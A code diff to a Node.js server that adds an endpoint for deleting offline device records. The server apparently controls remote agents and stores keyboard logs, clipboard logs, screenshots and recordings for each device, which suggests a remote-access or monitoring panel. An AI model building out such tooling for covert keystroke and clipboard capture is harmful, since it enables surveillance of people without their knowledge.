@@ -929,6 +929,23 @@ function listDevices() {
     });
 }
 
+function isDeviceConnected(deviceId) {
+  return (
+    agents.has(deviceId) ||
+    termAgents.has(deviceId) ||
+    proxyAgents.has(deviceId) ||
+    proxyClients.has(deviceId)
+  );
+}
+
+function removeDeviceRecord(deviceId) {
+  agentMeta.delete(deviceId);
+  clipboardLog.delete(deviceId);
+  keyboardLog.delete(deviceId);
+  screenshotLog.delete(deviceId);
+  recordingLog.delete(deviceId);
+}
+
 function broadcastDashboard(type, payload) {
   const msg = JSON.stringify({ type, ...payload });
   for (const ws of dashboardClients) {
@@ -1016,6 +1033,20 @@ app.get("/api/proxy/status", (req, res) => {
 
 app.get("/api/devices", authMiddleware, (_req, res) => {
   res.json({ devices: listDevices() });
+});
+
+app.delete("/api/devices", authMiddleware, (req, res) => {
+  const deviceId = String(req.query.deviceId || "").trim();
+  if (!deviceId) {
+    return res.status(400).json({ error: "deviceId required" });
+  }
+  if (isDeviceConnected(deviceId)) {
+    return res.status(409).json({ error: "device online, cannot remove" });
+  }
+  removeDeviceRecord(deviceId);
+  addAudit("device_remove", { deviceId });
+  broadcastDashboard("devices_changed", { devices: listDevices() });
+  res.json({ ok: true, deviceId });
 });
 
 app.get("/api/audit", authMiddleware, (req, res) => {
